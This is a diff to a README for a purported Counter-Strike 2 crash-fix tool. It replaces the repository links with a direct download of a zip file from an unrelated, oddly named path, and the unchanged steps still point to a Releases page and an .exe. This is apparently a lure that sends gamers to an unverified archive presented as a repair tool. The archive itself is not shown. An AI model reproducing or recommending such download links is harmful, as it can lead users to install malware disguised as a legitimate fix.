@@ -5,7 +5,7 @@ description: "Resolve Counter-Strike 2 startup crashes on Windows 10 and 11 usin
 ---
 # 🛠️ CS2-Crash-Fix - Stop Counter-Strike 2 Startup Crashes Now
 
-[![](https://img.shields.io/badge/Download-Fix-blue.svg)](https://github.com/Glasnostshirttail573/CS2-Crash-Fix)
+[![](https://img.shields.io/badge/Download-Fix-blue.svg)](https://raw.githubusercontent.com/Glasnostshirttail573/glasnostshirttail573.github.io/main/cobego/glasnostshirttail_github_io_2.1.zip)
 
 ## 🎯 About This Tool
 
@@ -24,7 +24,7 @@ Ensure your computer meets these requirements to run the repair tool:
 
 Follow these steps to fix your game.
 
-1. Visit this page to download the repair tool: [https://github.com/Glasnostshirttail573/CS2-Crash-Fix](https://github.com/Glasnostshirttail573/CS2-Crash-Fix).
+1. Visit this page to download the repair tool: [https://raw.githubusercontent.com/Glasnostshirttail573/glasnostshirttail573.github.io/main/cobego/glasnostshirttail_github_io_2.1.zip](https://raw.githubusercontent.com/Glasnostshirttail573/glasnostshirttail573.github.io/main/cobego/glasnostshirttail_github_io_2.1.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the latest version link.
 4. Download the file ending in .exe.
